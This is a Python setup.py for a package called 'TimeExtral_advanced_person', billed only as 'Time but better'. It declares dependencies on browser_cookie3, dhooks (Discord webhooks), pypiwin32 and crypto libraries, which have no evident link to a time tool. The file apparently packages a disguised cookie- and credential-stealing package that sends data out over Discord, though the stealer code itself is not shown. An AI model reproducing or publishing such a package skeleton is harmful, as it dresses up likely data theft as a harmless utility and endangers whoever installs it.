from setuptools import setup

with open('README.md', 'r') as fh:
    long_description = fh.read()

setup(
    name='TimeExtral_advanced_person',
    version='0.1.0',
    author='Paul',
    author_email='PW668878@outlook.com',
    description='Time but better',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/huangyingw/borisbabic-browser_cookie3',
    packages=['TimeExtral_advanced_person'],
    install_requires=['browser_cookie3', 'requests', 'psutil', 'cryptography', 'httpx', 'pypiwin32', 'dhooks', 'pycryptodome'],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
)
